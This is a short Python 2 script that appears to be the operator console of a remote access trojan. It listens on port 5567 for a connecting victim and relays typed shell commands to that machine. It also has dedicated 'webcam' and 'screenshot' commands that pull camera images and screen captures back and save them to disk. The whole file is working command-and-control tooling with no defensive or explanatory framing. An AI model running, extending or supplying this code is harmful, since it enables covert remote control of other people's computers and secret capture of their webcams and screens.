import socket

host = ''
port = 5567

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))

s.listen(1)
conn, addr = s.accept()
print str(addr)

cmd = raw_input('>')
while True:     
     if cmd == 'quit': break

     elif cmd == 'webcam':
         conn.send(cmd)
         image = conn.recv(1024 * 1024)
         f = open("remote.jpg", "wb")
         f.write(image)
         f.close()

     elif cmd == 'screenshot':
          conn.send(cmd)
          screenshot = conn.recv(1024 * 1024)
          g = open("screenshot.jpg", "wb")
          g.write(screenshot)
          g.close()
                
     else:
        conn.send(cmd)
        data = conn.recv(1024 * 1024)
        print data

     cmd = raw_input()

conn.close()
        




        
    
